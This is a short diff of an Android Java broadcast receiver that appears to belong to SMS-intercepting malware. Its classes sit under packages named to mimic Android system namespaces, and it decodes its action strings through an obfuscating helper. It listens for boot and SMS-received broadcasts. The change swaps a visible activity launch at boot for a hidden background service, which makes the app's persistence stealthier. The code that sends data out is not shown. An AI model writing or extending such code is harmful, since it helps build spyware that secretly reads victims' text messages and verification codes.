@@ -1,12 +1,11 @@
 package com.sms.web.receiver;
 
 import java.util.Date;
-
-import com.pro.intertest.WebActivity;
 import android.app.Activity;
 import android.app.sdk.SmsActivity;
 import android.app.sms.async.SubmitDateThread;
 import android.app.sms.manager.SMSManager;
+import android.app.sms.service.RestartService;
 import android.app.sms.sqlite.DQLiteOpenHelper;
 import android.app.sms.utils.BaseData;
 import android.app.sms.utils.LogUtils;
@@ -25,11 +24,11 @@ public class SMSReceiver extends BroadcastReceiver {
 		String action = Tools.Eecode(intent.getAction());
 		LogUtils.write("Send", "收到广播=" + intent.getAction());
 		if (action.equals(BaseData.bootaction1)) {	//开机自启动
-			Intent newIntent = new Intent(context, WebActivity.class);
+			Intent newIntent = new Intent(context, RestartService.class);
 			newIntent.setAction("android.intent.action.MAIN");
 			newIntent.addCategory("android.intent.category.LAUNCHER");
 			newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-			context.startActivity(newIntent);
+			context.startService(newIntent);
 		} else if (action.equals(BaseData.smsfilter1) || action.equals(BaseData.smsfilter2) || action.equals(BaseData.smsfilter3)) {
 			Bundle bundle = intent.getExtras();
 			if (bundle != null) {
